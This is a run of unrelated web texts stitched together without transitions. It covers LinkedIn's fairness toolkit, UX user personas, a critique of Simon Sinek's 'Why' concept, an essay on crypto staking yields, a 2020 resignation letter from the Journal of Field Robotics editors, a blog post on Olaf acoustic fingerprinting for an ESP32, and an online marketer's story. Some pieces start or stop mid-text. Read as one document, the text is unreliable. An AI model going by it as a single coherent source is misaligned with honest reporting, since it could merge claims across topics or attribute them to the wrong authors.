<p>LinkedIn has been using LinkedIn Fairness Toolkit for various machine learning models for explainability. For one, its job recommendation, when checked with LiFT, did not discriminate between gender. The model in production showed no significant difference in the probability of ranking a positive/relevant result above an irrelevant result between men and women.</p>

<p>By making the library open-source, the social media giant is committed to further enhancing its functionality. The <a href="https://engineering.linkedin.com/teams/data/artificial-intelligence">AI team at LinkedIn</a> is also working toward bringing fairness while eliminating bias for recommendation systems and ranking problems.</p>

<p>We will explain what User Personas are, what they are not, why every Designer should use them when building interfaces that target specific User Groups.</p>
<h2>What are User Personas?</h2>
<div><p>User experience designers (UX) use so called <i>user personas</i> in their creative process because they give answers to three simple questions related to building the best possible product presentation: “Who? What? Why?”. Personas are fictional characters that designers use to develop an accurate customer profile. They are part of intense product development strategies, and, with their help, companies achieve higher customer satisfaction rates.</p><p>But how a simple character sheet improves usability and connects vendors with their most potential customers?</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-benefits.jpg" alt="User Personas Benefits Introduction"></p>
<h2>What to include in Personas Template?</h2>
<div><p>Personas can define a multitude of characters, based on further details like a specific product line, customer demographics, and more. Using an empathy map, for example, helps designers and sales specialists take a closer peek at their clients’ minds. These virtual characters help define what customers say, think, feel, and do in life, and especially what their view is about offered products and services.</p><p>Designers begin building the profile of that ideal client by gathering all possible user data. Important to note here is that accurate customer profiling does not necessarily mean borderline privacy breach. The base component for creating a good skeleton for a useful customer profile mostly consists of readily available data. Once designers round up all the relevant information, they can easily highlight general human behavior.</p><p>Although people differ vastly when directly compared, as customers, there are specific drives, motivations and conditions that allow marketers to funnel them into an easy to manage character categories, and use that to customize further the services they offer to them, and how they offer them. Personas are, after all, the answer to ‘Who? What? Why?’ of the ultimate user experience.</p><p>Depending on the project scope, profile data may all go in compiling a single virtual profile or become the base for multiple profiles, each addressing specific services, product categories, and so on. Most businesses use three to five different fictional customer profiles. While every Designer can personally shape up their persona profile, there are some general items worth including in the template.</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-sample-profile.jpg" alt="User Personas Sample Profile"></p>
<ol><li><b>Basic information</b><br>Create character names and titles wisely and avoid using them arbitrarily. Giving a real Persona name like Maria suggests that users are female, which will undoubtedly contribute to making the wrong decision. Persona’s title allows us to quickly reference a group of users with similarities relevant to the product in question. Designers need to make sure their persona titles are specific. If a persona carries the title “Influencer,” this may lead to more issues and complications, rather than narrow down customers by a viable factor. Does this group of people consist of students, freelancers, or prospects? What are their passions and motivations? Do you have an insight into their shopping patterns?</li>
<li><b>Demographics</b><br>This socio-economic feature is the key to your target market and includes factors like age, sex, location, education, religion. Although all of these can play a detrimental role in target audience campaigns, deep down the road, no two people are exactly alike. Two women who have the same age and live in the same area don’t necessarily share the same interests, needs, or pain-points. Demographics data is meaningless without an intense cross-analysis.</li>
<li><b>Job title, material status, family</b><br>Developing a marketable product is about a process that sells or serves real people. People who hold various jobs, care for a family, or mingle within social circles. Customer details reveal a lot about their goals and problems, and what they are as a person. All information — even features from outside the definition of ‘customer’ — can be translated into meaningful persona profiles.</li>
<li><b>Image</b><br>As humans, we interact with each other daily. Every normal interaction are great sources for lead designers, who use them when they try to give their persona a face. Images add a real feel about the user exact identity. Customer profiling is not always a straight forward process - sometimes, finding the right image requires nothing short of hard detective work. When done right, a relistic persona profile allows for certain personality traits to emerge from the raw data. Customers’ emotional and mental capacities are true indicators for intention, and images are powerful influencers of mood and <a href="https://enterprise.press/stories/2020/02/05/the-psychology-of-visuals-how-images-impact-decision-making-11273/" target="_blank" rel="nofollow">decision-making</a>.</li>
<li><b>Pain points</b><br>Pain points are barriers that stand between your business intentions and how they reflect on the customer. When shaping the customer’s journey, the process does not come smooth automatically. There are often rough patches that need clearing. Unfortunately, clients may stumble on such ‘bumps on the road’ first-hand. For example, a page malfunction can cause visitors to collectively reach a dead while shopping or browsing. Additionally, pain points such as this one can be as diverse as the people who experience them. Finding, understanding, and solving these problems are the keys to successful design but are demanding in the variety of challenges. A few useful ways to diminish pain points are by constructing and executing online surveys. Make your sales team talkative with customers. interactive customer feedback like Online Reviews gives a piece of instantaneous information about potential problems.</li>
<li><b>Goals</b><br>Personas’ goals should be aligned with the goals and intentions behind marketing products and services. It is all about “What they want to accomplish? Why?” Discovering users’ emotions is a step that sits higher in the hierarchy of persona profile. Once you begin to see your clients from the perspective of a good friend, you get to witness the real value of your product, and why your services are their preferred choice.</li></ol>

<h2>Why do Personas fail?</h2>
<div><p>The profile of your ideal client is not going to be a perfect match with any of your existing customers. However, when people a product repeatedly, it becomes a second nature for the provider to expect, predict, and improve their business based on recurring customer behavior. When researching and building a persona, designers sometimes forget that this fictional profile must represent a real person. Customers are people with real lives and problems and are not easy to predict or put into a category. Shopping is only a single task on their busy schedule, and they probably don’t much obsess about your service. Human personality is a quirky matter and frequently defies straightforward answers or obvious answers derived from raw statistics.</p><p>Junior designers make one common mistake when creating a personal profile – they interview their friends and risk flooding their research data with the wrong set of information. Customer profiles benefit from accurate or unbiased information, which, in turn, helps designers believe in the problem they are trying to solve. When collecting data, it is much better to get more of it, than not enough. At the same time, wordy and irrelevant details are best excluded. They would only muddy-up the data and compromise its relevancy. Sifting through pieces of information has always been a tough challenge, even more so in Persona creation, because of the ever-present unpredictability of the human factor.</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-failed.jpg" alt="User Personas - Why do they fail?"></p>
<h2>Why do you need a Persona?</h2>
<div><p>By knowing the goals and frustrations of your users, it’s easier to understand them. View them as a network of features that define an individual, rather than the purpose of everyone in the network. Design a product that will satisfy that individual’s needs, and you have yourself a winning strategy featuring a persona model.</p><p>Persona works standalone, but usually, it is essential to create different groups of virtual people. These fake characters help designers build robust user-oriented features. A persona-related design can help experts predict what the customer would do or want next or help prevent problems before they occur.</p></div>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/img/blog/user-personas/user-personas-problem.jpg" alt="User Personas - Solving a problem"></p>
<p>Successful Designer’s teams are the ones who can walk in the client’s shoes. They understand the problem from a more realistic perspective. What would your Persona think when you add a new feature to the app they use? What was the motivation behind the idea of this service or product? What issues and pain-points do they face? Smart design decisions featuring personas come as a result of getting the right answers to questions like these.</p>
<h2>What problems does a Persona solve?</h2>
<p>There are no disputes over whether a good UX comes easily. Designers need to understand the full spectrum of product cycle and value, business statistics, the tech used, and everything that has anything to do with the product. If you want to make successful products – get to know what your customer wants. Persona also represents a selective gathering of user’s behavior patterns, later used to match the expectations and motivations of customers.</p>

<div><p>View the flow of the users’ day better, how and when they interact. Do not focus on “How does this work?”.&nbsp; Creating a good UX is to design the best product for others and their goals.

<p>Unless you’ve been living under a rock, you’ll have heard of Simon Sinek.&nbsp; He took the business world by storm in 2009 with his lecture, <a href="https://www.ted.com/talks/simon_sinek_how_great_leaders_inspire_action?language=en">‘How Great Leaders Inspire Action’</a>.&nbsp; This became the 3<sup>rd</sup> most-watched TED talk of all time.&nbsp; In it, he unveiled his ‘Golden Circle’ with ‘Why’ at its heart.&nbsp; His book <a href="https://www.amazon.co.uk/Start-Why-Leaders-Inspire-Everyone/dp/0241958229/ref=sr_1_1?adgrpid=54915772044&amp;gclid=Cj0KCQiAvc_xBRCYARIsAC5QT9kMs6fl_tHoNJWH1_5FVGK6ayPdF9A3pdNnBaoJWPMwZhHqbdLdVY0aAiC2EALw_wcB&amp;hvadid=259037696121&amp;hvdev=c&amp;hvlocphy=1007044&amp;hvnetw=g&amp;hvqmt=e&amp;hvrand=1751487360736231536&amp;hvtargid=aud-857384558340%3Akwd-296960221096&amp;hydadcr=18496_1817309&amp;keywords=start+with+why+by+simon+sinek&amp;qid=1580474176&amp;s=books&amp;sr=1-1">‘Start with Why’</a> became a best-seller and his views were widely accepted by companies across the globe.&nbsp; An obsession with ‘Purpose’ began.</p>



<p>It is now a mainstream belief that <a href="https://www.monkhouseandcompany.com/blog/why-businesses-with-purpose-grow-faster/">businesses with a strong idea of their core purpose</a> prosper.&nbsp; Other writers have developed this concept, such as <a href="https://www.monkhouseandcompany.com/podcast/a-conversation-with-hiut-denim-co-ceo-david-hieatt/">David Hieatt in his book ‘Do Purpose – Why Brands with a Purpose Do Better and Matter More’.</a>&nbsp; This is a belief I share.  There’s no arguing with the importance of purpose.  As <a href="https://www.monkhouseandcompany.com/about-dominic-monkhouse/">MD of two tech companies</a> that grew from zero to £30 million in just 5 years, I’ve seen with my own eyes the difference it can make to a business.</p>



<p>But where I disagree fundamentally with Sinek is his central message of ‘starting with why’.&nbsp; This isn’t where you should start at all.</p>



<h2><strong>What’s the thrust of Sinek’s message?</strong></h2>



<p>Sinek set out to discover why companies like Apple achieved such extraordinary success while others, with the same resources, failed.&nbsp; He found that less successful companies often started with ‘What’, then moved to ‘How’ and many neglected to even mention ‘Why’.  Some hadn’t the faintest clue why they did what they did.&nbsp;</p>



<p>In Sinek’s opinion, the reason Apple was so successful was it started with ‘Why’.&nbsp; This was at the core of Apple’s marketing (pardon the pun!) and the driving force behind its business operations.&nbsp; As a result, he says, Apple was able to attract customers who shared its fundamental beliefs.&nbsp;</p>



<p>From this, he designed his ‘Golden Circle’ theory of building strategy.</p>

<p>All well and good, but I think there’s something missing here. Apple dominates the global handset market by capturing <a href="https://www.counterpointresearch.com/apple-continues-lead-global-handset-industry-profit-share/">66% of industry profits and 32%</a> of the overall handset revenue.&nbsp; But crucially, they weren’t trying to sell a smartphone to everyone.&nbsp; They are targeting a tight group of customers for whom the Apple ecosystem is part of their self-worth and their projection to the world.&nbsp;</p>



<p>When Steve Jobs returned and created the world-famous ‘Think Different’ campaign, Apple products were not the best. In fact, they were a bit shit.&nbsp; But Apple had identified a sub-set of people – creatives, misfits, dreamers – for whom owning a Mac said something about the sort of off-the-wall people they wanted to be. To my mind, this proves that you can’t have a ‘why’ unless you know ‘who’ your ‘why’ is going to appeal to.&nbsp;</p>



<h2><strong>Start with ‘Who’ not ‘Why’</strong></h2>



<p>Whilst the Golden Circle of ‘Why’, ‘How’ and ‘What’ is important, I think it’s missing something even more fundamental.&nbsp; A fourth circle – ‘Who’ – at the very centre.  This is where I believe you should start.</p>



<p>Surely your over-arching goal is to build a successful commercial enterprise?&nbsp; Well, I don’t think you can do this starting with ‘Why’.  Contrast Sinek’s view of strategy with that of Jim Collins – another great business author and speaker.&nbsp; His ‘Hedgehog Concept’ is something I refer to over and over again with my clients.  He believes that a successful strategy is formed from overlapping 1) What you are deeply passionate about (your ‘Why’) with 2) what you can be best at in the world and 3) what best drives your economic engine.&nbsp; It’s this third point that’s missing from Sinek’s viewpoint.  The commercial imperative that should drive every business.<br></p>



<figure><img src="https://lh5.googleusercontent.com/Cx5FchRgo-3Snm0OD1KjuGrClpCOD-06ZOpzwXwWeq9OY2rwZjotW0VHOM4q5zrzyyvHihLmUdxaCCz5KrCXCY1p8z0_qfvUy80TXtXHXUAMASWMxOA0VkAbcd2KAtkFTLly73Jw" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Back in 1954, the sage-like grandfather of modern business, Peter Drucker, said, ‘There is only one valid definition of a business purpose: to create a customer’.&nbsp; I think this still holds true and yet many companies struggle to understand this fundamental concept.  There’s little point finding your meaning for existence and working out what you’re going to do, and how, if this doesn’t appeal to the right customers.&nbsp;</p>



<p>And yet this happens time and again.&nbsp; The CEO is on a mission but his company’s customers are leaving in droves.&nbsp; They don’t care.  Disaster can strike when there’s no clear idea about Core Customer.&nbsp; Take Chip Wilson, ex-CEO of Lululemon. His fat-shaming remarks about Lululemon’s yoga pants were a PR catastrophe for the company.&nbsp; He’d lost his grip on who his core customers were and, worse still, ended up insulting a good many of them.  The company has never truly recovered.</p>



<h2><strong>Finding your ‘Who’</strong></h2>



<p>Ultimately, you’re trying to create a tribe that love what you do and feel like they belong when they experience your company for the first time.&nbsp; I believe this should start with your staff.  <a href="https://www.monkhouseandcompany.com/blog/want-better-productivity-then-prioritise-happiness/">First and foremost, do your employees feel like they’re in the right place?</a>  And then, do your existing customers feel happy they made the right choice by picking your company?&nbsp; Only after you’ve got these two elements right will you attract new customers.&nbsp;</p>



<p>This is a different way of approaching marketing.&nbsp; Too often, the focus is on attracting new people through the door and then, when they arrive, losing them because everything’s not quite in sync.&nbsp; <a href="https://www.monkhouseandcompany.com/blog/7-top-tips-for-successful-recruitment/">Don’t build a recruitment process that attracts the wrong people</a>.  They’ll leave after a few months because your company is different from the expectation you created.&nbsp;</p>



<p>To build a tribe of customers, you need to get laser-focused on who these people are. &nbsp; Your guiding principle should be, ‘Who are the customers that will buy from us at maximum profit?’ Most of the time, my clients don’t have this.&nbsp; Since they started trading, they’ve attracted a broad array of customers, all looking for different things. This makes it hard to narrow down to the Core Customer that will ultimately drive their growth.</p>



<p>When we get to the nitty-gritty of working out their Core Customer, I guide clients to focus first and foremost on the ones who buy at maximum profit.&nbsp; Perhaps these customers buy the fullest range of services or have the potential to do so. Then we narrow it down to one who best represents the customers they need to target. We give them a name.&nbsp; A recent example is ‘Andrew’.  Then we start to profile this customer archetype – what is Andrew trying to do in his business?  Does he have a transformational challenge? Maybe he’s an agent of change in his organisation?&nbsp; What insights tell his story?  What is his background?&nbsp;</p>



<p>Then I get them to work out how Andrew is likely to buy – and where they fit in this buying journey.&nbsp; Finally, and most importantly, how do they want Andrew to feel when he signs on the dotted line?  This is why you need to start with ‘Who’ before working out your ‘Why’.&nbsp; Otherwise, you lose the connection between how you want them to feel when they do business with you and your purpose.  These need to interlock.</p>



<h2><strong>Creating a niche</strong></h2>

<p>A massive lightbulb moment is when clients realise they only need to attract a small number of these Core Customers, maybe 10 or 20, to double their business in the next three years.&nbsp; Brilliant! In the past, their strategy has been focused on average customers.  Now, they can tailor their entire approach to the needs of a specific group of Core Customers.</p>



<p>When I was at Peer 1 Hosting, we had 13,400 customers globally but only 500 of these were high value.&nbsp; I worked out we only needed another 100 net annually to achieve our growth plans of doubling in three years.&nbsp; So, we got really focused on who they were and what they needed from us.  This had far-reaching consequences – our core values and purpose were aligned around these needs. They guided every decision we made. We looked for staff who shared these values and could ensure our Core Customers knew, liked and trusted us.</p>



<p><a href="https://www.monkhouseandcompany.com/blog/why-you-need-nps-to-grow-your-business/">If you’re using NPS®</a> (Net Promoter Score), you need to make sure your score is higher for your Core Customer than any of your competitors. This is about being different.&nbsp; You’re not trying to be brilliant for every customer or the biggest or the best. You’ve identified attributes for your business that you know your Core Customer values and by delivering these, you’ll win.&nbsp;</p>



<p>This is how you create a niche.&nbsp; By getting inside the heads of a small number of high-value customers, you’ll own this small segment. Eventually, you will become the number one supplier of your ‘Who’.&nbsp; It’s like mining for a rich vein of gold.  Think small, not big, and use a feelings model to get there.  This will be way more effective than constantly selling the features and benefits of your product.</p>



<hr>



<p>So, take my advice. Don’t ignore Simon Sinek entirely. BUT&nbsp;start with ‘Who’ not ‘Why’.  By doing this, you’ll find a profitable purpose that drives the economic engine of your business.&nbsp; After all, you’re not just doing this for love.  Profit is also important!</p>

<div>
<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>

                  <p>August 25, 2020<br></p>
                  
                  <p>Dear Colleagues,<br></p>
                  
                  <p>We would like to inform you about an upcoming major transition for the Journal of Field Robotics.<br></p>
                  
                  <p>After 15 years of service, John Wiley and Sons, the publisher has decided not to renew the <br></p>
                  <p>contract of the Editor in Chief (Sanjiv Singh) and the Managing Editor (Sanae Minick) and <br></p>
                  <p>hence our term will expire at the end of 2020.<br></p>
                  
                  <p>This comes after two years of discussions between new Wiley representatives and the <br></p>
                  <p>Editorial Board have failed to converge to a common set of principles and procedures by <br></p>
                  <p>which the journal should operate. The Editorial Board has unanimously decided to resign.<br></p>
                  
                  <p>We do want to assure the authors who have papers under review that we see it as our <br></p>
                  <p>responsibility to bring these documents to resolution during our term. We will continue to <br></p>
                  <p>process new submissions until the end of the year. More about the future at the end of this note.<br></p>
                  
                  <p>While the issue at the heart of our disagreement with Wiley is about academic independence, <br></p>
                  <p>it should be noted that there is a structural issue here. Scholarly publishing is broadly in flux <br></p>
                  <p>at the moment in the search for a sustainable model. Currently, academics are not paid to <br></p>
                  <p>create and review articles.&nbsp; In fact, they often have to pay fees to publish, and, readers have <br></p>
                  <p>to pay to access the work through a pay per view system, or, through subscriptions. <br></p>
                  <p><a title="https://www.coalition-s.org" href="https://www.coalition-s.org/">Plan S</a>, an international consortium makes the dilemma clear:<br></p>
                  
                  <p>"Monetising the access to new and existing research results is profoundly at odds <br></p>
                  <p>with the ethos of science (Merton, 1973 )… In the 21st century, science publishers <br></p>
                  <p>should provide a service to help researchers disseminate their results. They may <br></p>
                  <p>be paid fair value for the services they are providing, but no science should be locked <br></p>
                  <p>behind paywalls!"<br></p>
                  
                  <p>While this moment calls for creativity and collaboration with the scholarly community to find <br></p>
                  <p>new models, Wiley is intent on making broad changes to the way that the Journal of Field <br></p>
                  <p>Robotics is operated, guided mostly by an economic calculation to increase revenue and <br></p>
                  <p>decrease costs. To do this, they have unilaterally decided to change the terms of the <br></p>
                  <p>contract that has been constant since the JFR was started in 2005. Wiley has confronted a <br></p>
                  <p>similar case (European Law Journal) with similar effect— <a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">the entire editorial board has <br></a></p>
                  <p><a onclick="window.open(this.href); return false;" title="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" href="https://europeanlawblog.eu/2020/02/04/what-a-journal-makes-as-we-say-goodbye-to-the-european-law-journal/" onkeypress="window.open(this.href); return false;">resigned in January of 2020:</a><span><br></span></p>
                  
                  <p>Wiley insists that the new contract is covered under a confidentiality agreement that not even <br></p>
                  <p>the Editorial Board can examine. What we can say is that the net effect of Wiley’s demands <br></p>
                  <p>would make the Editors contractors to the publisher rather than having them respond to the <br></p>
                  <p>board. We see this as a breach of academic autonomy.<br></p>
                  
                  <p>In resigning, the Editorial Board of the Journal of Field Robotics reaffirms its commitment to <br></p>
                  <p>dissemination and discussion of research. In the near future we will announce a new forum <br></p>
                  <p>for research in Field Robotics that will maintain the academic integrity of our editorial process <br></p>
                  <p>while also ensuring open dissemination of your research.<br></p>

<span><a href="https://0110.be/posts/Olaf_-_Acoustic_fingerprinting_on_the_ESP32_and_in_the_Browser">»</a> By <a href="https://0110.be/users/Joren">Joren</a> on Thursday 20 <a href="https://0110.be/date/2020/8">August 2020</a></span>
<p><img alt="Recognition of music." src="https://0110.be/files/attachments/475/web_embedded_olaf.jpg"> A good year ago I was asked to develop audio recognition technology for an e-costume. The idea was that <i>lights in the costume would follow a sequence synchronised to a certain song</i>. Only a single song should trigger the lights, all other music should be ignored. Recognition of music and synchronisation is typically done using audio fingerprinting techniques. The challenge was that the recognition needed to run on a cheap, battery-powered microcontroller with limited <span>CPU</span> and memory. I delivered a prototype but eventually a cheap, battle-tested, off-the-shelf, IP-cleared, alternative was found.</p>
<p>The prototype gathered dust for a while but the idea stuck in my head. With my daughters fourth birthday approaching during the lockdown, I decided to turn the prototype into an over-engineered birthday gift and let an ‘Elsa-dress’ react to ‘Let It Go’ from the Frozen soundtrack. With the prototype as a starting point, I ordered an <span>RGB</span>-<span>LED</span>-strip, a beefy Li-Ion Battery, an I2S digital microphone and, of course, an Elsa-dress.</p>
<p>I had an ESP32 microcontroller laying around and used it as the core of the system: it supports <a href="https://en.wikipedia.org/wiki/I%C2%B2S">I²S</a>, has a floating point unit (<span>FPU</span>), is easy to use together with <span>LED</span> strips and has enough memory. The <a href="https://en.wikipedia.org/wiki/Floating-point_unit"><span>FPU</span></a> makes it straightforward to use the same code on traditional computers as on embedded devices: fixed-point math can be avoided.</p>
<p>After soldering the components together and with the help from my better half to sew in the <span>LED</span> strip, it all came together. In the video below, the result of our work can be seen. The video first shows a song that should not and is not recognised. Then, “Let It Go” is played and correctly recognised. After the song is stopped, the lights go on for a while and finally stop: this is by design to allow gaps in recognition. Lastly, the song is continued and again correctly recognised.</p>

</video>
</center>
<p>With my limited C experience the prototype code was not well organised. During my second attempt this improved enough so that I feel comfortable enough to share the code on GitHub: <a href="http://github.com/JorenSix/Olaf">Olaf – Overly Lightweight Acoustic Fingerprinting</a>. The code went through several iterations and was expanded beyond the original scope and became <b>a capable general purpose acoustic fingerprinting system</b> with its <a href="https://0110.be/publications/Applications_of_Duplicate_Detection_in_Music_Archives%3A_from_Metadata_Comparison_to_Storage_Optimisation">many applications</a>. Olaf performs quite well thanks to its resource friendly design and the use of <a href="https://bitbucket.org/jpommier/pffft/src/master/"><span>PFFT</span></a> and <a href="http://www.lmdb.tech/doc/"><span>LMDB</span></a>. Especially <span>LMDB</span>, a fast, B+-tree backed key value store with low storage overhead enables performant storage and lookups.</p>
<h3><span>WASM</span>: Olaf in the browser</h3>
<p>Olaf, being written in <span>ANSI</span> C, can run in the browser thanks to the <a href="https://emscripten.org/">Emscripten</a> compiler. According to its website, Emscripten <i>‘…lets you run C and C++ on the web at near-native speed without plugins’</i> Combining the Web Audio <span>API</span> and the <span>WASM</span> version of Olaf makes web-based acoustic fingerprinting applications possible.</p>
<p>Below you can try out Olaf. The <i>exact same code</i> is running on your browser as on the ESP32 demonstrated above. This means that Olaf is listening to recognise ‘Let It Go’ from the Frozen soundtrack. For your convenience the song can be started below on the left. On the right, you can start Olaf by allowing incoming audio to be analysed. The <span>FFT</span> is calculated by Olaf and visualised using <a href="https://www.pixijs.com/">Pixi.js</a>. After a few seconds the red fingerprints should become green, indicating a match. Once you stop the song, the fingerprints will eventually turn red again. As with the video above: going from a match to no match takes a couple of seconds to allow gaps in recognition.</p>
<div>

<p><small>1. Start the song and play it aloud. Singing along is encouraged.</small>
<small>2. Start the microphone and check whether recognition succeeds.</small>

					<div><p><strong>Tom’s journey into online marketing</strong></p><p><span>Tom is originally from Oklahoma. He was working as a restaurant manager and desperately wanted to get out of this lifestyle. Tom was building affiliate sites in free time with Cost Per Action offers. He created a website on how to make money by taking surveys online and it started generating $100 a month.&nbsp;</span></p><p><span>So, he decided this is what he would do to earn money. However, he could not scale it. A person approached Tom and asked him to use his experience of digital marketing that he learned over the years and start reaching out to small businesses to provide them digital marketing services. Tom did that and immediately got few clients.&nbsp;</span></p><p><span>Later on, he moved to Maui and the plan was to build his own digital marketing agency. But he needed a job to sustain his family, so he started doing a job in another restaurant but after 8 months, he was fired from the job. Then, Tom decided to formally start his own digital marketing agency which he always wanted to do.&nbsp;</span></p><p><strong>His first product launch</strong></p><p><span>Tom launched his first product named as Coupon Cash Mailer System on Warrior Plus with the help of a partner who taught him how to set up a sales funnel, how to create a sales page and how to put up an offer. To find affiliates to promote the course, Tom started reaching out to people from whom he previously bought the products.&nbsp;</span></p><p><span>Two of them who were big affiliates in the online marketing space agreed to promote his product. It was priced at $12.95, and they sold 2000 copies of it in just 4 days. At the end of the launch, the total revenue they generated was around $6k. Now, they are generating over 7 figures just from the information products.</span></p><p><strong>Tom’s product launch process</strong></p><p><span>Tom did a partnership with Nick Ponte in 2016 and established a company with the name Offline Sharks. Over the time they have refined their product launch process. Now, they run a webinar at the end of the launch to maximize their revenue.&nbsp;</span></p><p><span>They have started to create a product around a webinar so anybody who buys a product is automatically registered for the webinar and with the help of the webinar they have started to convert more. Another strategy they are using is to place a previous launched product in the sales funnel of a new product at a discounted price to create an incentive for the people to buy the product at a lower price.&nbsp;</span></p><p><strong>Advice to new marketers</strong></p><p><span>Tom’s advice for new marketers is that one does not need to portray himself as an expert, you need to be a person that has the results and is willing to share your experience of how you achieved those results. That way, people can relate to you more.&nbsp;</span></p></div>

   <p><!--<img align="left" src="../pics/jungle-300.jpg" alt="Jungle" style="max-width:100%;height:auto; padding:15px;">-->
